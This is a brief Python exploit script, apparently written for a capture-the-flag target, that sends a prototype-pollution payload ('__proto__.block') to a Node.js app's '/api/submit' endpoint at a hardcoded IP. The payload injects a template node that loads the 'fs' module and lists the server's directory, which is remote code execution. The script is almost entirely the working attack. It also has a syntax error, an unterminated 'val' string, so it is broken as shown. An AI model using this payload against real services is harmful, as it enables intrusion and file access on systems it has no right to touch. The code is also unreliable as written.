import requests

target = 'http://138.68.179.198:31311'

#sending payload
r = requests.post(target + '/api/submit', json = {
"song": 
    { 
        "name":"Not Polluting with the boys" 
    }, 
    "__proto__.block": 
    {
        "type": "Text",
        "line": "'test'; return process.mainModule.constructor._load('fs').readdirSync('./', {encoding:'utf8', flag:'r'})",
        "val": "crypt0ace
    } 
}

# execution
print(r.status_code)
print(r.text)
requests.get(target)


